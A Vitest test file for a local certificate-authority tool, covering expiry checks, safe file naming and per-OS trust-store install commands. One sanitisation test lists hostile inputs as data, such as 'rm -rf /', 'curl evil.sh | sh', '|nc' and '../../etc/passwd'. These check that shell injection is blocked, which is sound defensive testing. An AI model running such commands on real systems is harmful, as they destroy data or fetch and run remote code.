import { describe, expect, it } from 'vitest';
import { BROWSER_MAX_DAYS, daysLeft, expiryState, parseList } from './names';
import { fileName, operatingSystems, safeStem, trustCommands } from './trust';

describe('parseList', () => {
  it('splits on lines, commas, semicolons and spaces, trims, drops empties and duplicates', () => {
    expect(parseList('a.lab\n b.lab , c.lab;a.lab  \n\n')).toEqual(['a.lab', 'b.lab', 'c.lab']);
    expect(parseList('')).toEqual([]);
    expect(parseList('   \n ')).toEqual([]);
  });
});

describe('expiry', () => {
  const now = new Date('2026-10-20T12:00:00Z');
  it('counts whole days, rounding up', () => {
    expect(daysLeft('2026-10-21T12:00:00Z', now)).toBe(1);
    expect(daysLeft('2026-10-21T12:00:01Z', now)).toBe(2);
    expect(daysLeft('2026-10-20T12:00:00Z', now)).toBe(0);
    expect(daysLeft('2026-10-10T12:00:00Z', now)).toBe(-10);
  });
  it('classifies expired, soon (30 days or less) and ok', () => {
    expect(expiryState('2026-10-19T00:00:00Z', now)).toBe('expired');
    expect(expiryState('2026-10-20T12:00:00Z', now)).toBe('expired'); // expires right now
    expect(expiryState('2026-11-19T12:00:00Z', now)).toBe('soon');
  });
  it('treats 31+ days as ok', () => {
    expect(expiryState('2026-11-20T12:00:00Z', now)).toBe('ok'); // exactly 31 days
  });
  it('knows the browser limit', () => expect(BROWSER_MAX_DAYS).toBe(398));
});

describe('trust instructions', () => {
  it('reduces any CA name to a safe file stem', () => {
    expect(safeStem('Lab Root CA')).toBe('lab-root-ca');
    expect(safeStem('Autoridade Café São João')).toBe('autoridade-cafe-sao-joao');
    expect(safeStem('  --weird__name..  ')).toBe('weird__name');
    expect(safeStem('')).toBe('ca');
    expect(safeStem('!!!')).toBe('ca');
    expect(safeStem('日本語')).toBe('ca');
  });

  it('never lets shell metacharacters reach a command', () => {
    const hostile = [
      'x; rm -rf /', 'x && curl evil.sh | sh', '$(reboot)', '`id`', "a'b", 'a"b', 'a\nb', 'a b\tc',
      '../../etc/passwd', '-rf', '|nc', 'a>b', '*.lab', 'name‮txt', '%PATH%', '$HOME', '~root', '{a,b}',
    ];
    for (const name of hostile) {
      expect(safeStem(name), name).toMatch(/^[a-z0-9][a-z0-9._-]*$/);
      for (const os of operatingSystems) {
        const cmd = trustCommands(os, name);
        const benign = trustCommands(os, 'benign');
        if (cmd === null || benign === null) continue;
        // Only the name (the file name, and the Java alias) may differ from a command built for a harmless name.
        expect(cmd, `${os} / ${name}`).toBe(benign.replaceAll('benign', safeStem(name)));
      }
    }
  });

  it('gives the right commands per OS and a walkthrough for Firefox', () => {
    expect(trustCommands('debian', 'Lab Root')).toContain('update-ca-certificates');
    expect(trustCommands('debian', 'Lab Root')).toContain('/usr/local/share/ca-certificates/lab-root.crt');
    expect(trustCommands('rhel', 'Lab Root')).toContain('update-ca-trust');
    expect(trustCommands('macos', 'Lab Root')).toContain('add-trusted-cert');
    expect(trustCommands('windows', 'Lab Root')).toContain('Cert:\\LocalMachine\\Root');
    expect(trustCommands('firefox', 'Lab Root')).toBeNull();
  });

  it('covers the stores that are not the operating system\'s', () => {
    const alpine = trustCommands('alpine', 'Lab Root')!;
    expect(alpine).toContain('apk add --no-cache ca-certificates');
    expect(alpine).toContain('update-ca-certificates');
    const java = trustCommands('java', 'Lab Root')!;
    expect(java).toContain('keytool -importcert -cacerts');
    expect(java).toContain('-alias lab-root -file lab-root.crt');
    expect(trustCommands('node', 'Lab Root')).toBe('export NODE_EXTRA_CA_CERTS="$PWD/lab-root.crt"');
    const py = trustCommands('python', 'Lab Root')!;
    expect(py).toContain('python3 -m certifi');
    expect(py).toContain('REQUESTS_CA_BUNDLE');
    const ctr = trustCommands('containers', 'Lab Root')!;
    expect(ctr).toContain('apt-get install -y --no-install-recommends ca-certificates');
    expect(ctr).toContain('COPY lab-root.crt /usr/local/share/ca-certificates/lab-root.crt');
    expect(ctr).toContain('RUN update-ca-certificates');
  });

  it('names download files safely, including wildcard certificates', () => {
    expect(fileName.leafCert('*.apps.lab')).toBe('wildcard.apps.lab.crt');
    expect(fileName.leafKey('app.lab')).toBe('app.lab.key');
    expect(fileName.leafChain('app.lab')).toBe('app.lab-fullchain.pem');
    expect(fileName.caCert('Lab Root CA')).toBe('lab-root-ca.crt');
    expect(fileName.caKey('Lab Root CA')).toBe('lab-root-ca.key');
  });
});
